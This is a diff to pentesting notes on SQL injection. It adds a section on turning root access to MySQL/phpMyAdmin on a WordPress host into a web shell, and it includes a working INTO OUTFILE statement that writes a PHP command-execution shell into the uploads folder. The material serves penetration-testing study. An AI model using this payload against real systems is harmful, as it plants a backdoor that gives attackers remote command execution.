@@ -114,3 +114,12 @@ Oracle syntax requires the use of FROM, but some queries don't requires any tabl
 
 - See updated chart: [Attacks and tools for web pentesting](index-attacks-tools-web-pentesting.md).
 - Detailed **Cheat sheet** with manual union and blind attacks can be found in the [SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
+
+
+## Gaining a reverse shell from SQL injection
+
+Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
+
+```mysql
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+```
